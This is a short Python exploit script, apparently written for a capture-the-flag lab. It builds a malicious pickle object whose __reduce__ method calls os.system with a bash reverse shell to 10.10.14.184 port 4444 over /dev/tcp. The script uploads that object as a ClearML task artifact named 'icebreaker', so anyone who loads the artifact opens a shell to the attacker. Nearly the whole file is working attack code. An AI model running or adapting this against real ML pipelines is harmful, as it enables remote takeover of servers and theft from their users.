#!/usr/bin/python3

from clearml import Task
import os, pickle

# Variables and Configuration
local_ip = "10.10.14.184"
port = 4444
command = f"bash -c 'bash -i >& /dev/tcp/{local_ip}/{port} 0>&1'" 
# Useful Resources for /dev/tcp/IP/PORT
# https://www.gnu.org/savannah-checkouts/gnu/bash/manual/bash.html#Redirections
# https://w0lfram1te.com/exploring-dev-tcp

# Class for Pickling Exploit
# Useful Resource for Python Pickling: 
# https://davidhamann.de/2020/04/05/exploiting-python-pickle/
class exploit:
    def __reduce__(self):
        # (Callable Object, (Parameters))
        return (os.system, (command,)) # Must have 2-6 values for the Parameters tuple

task = Task.init(project_name="Black Swan", 
                 task_name="Review JSON Artifacts", 
                 tags=["review"],
                 task_type=Task.TaskTypes.data_processing, 
                 output_uri=True)
task.upload_artifact(name="icebreaker", 
                     artifact_object=exploit(), 
                     retries=2, 
                     wait_on_upload=True)
